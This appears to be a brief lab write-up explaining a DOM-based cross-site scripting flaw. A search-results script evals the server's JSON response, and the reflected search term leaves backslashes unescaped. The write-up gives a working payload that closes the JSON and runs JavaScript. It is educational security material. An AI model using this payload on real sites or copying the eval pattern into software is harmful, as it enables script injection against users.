There is `searchResults.js`, which creates a new variable from the returned json
```javascript
eval('var searchResultsObj = ' + this.responseText);
```
In the json our search term is included
```json
{"results":[],"searchTerm":"bla"}
```
While `"` is escaped `\` is not.
So we can craft a payload, closing the json and write more javascript.
The comment ignores the remaining end of the json.
```
\"};alert(1)//
```
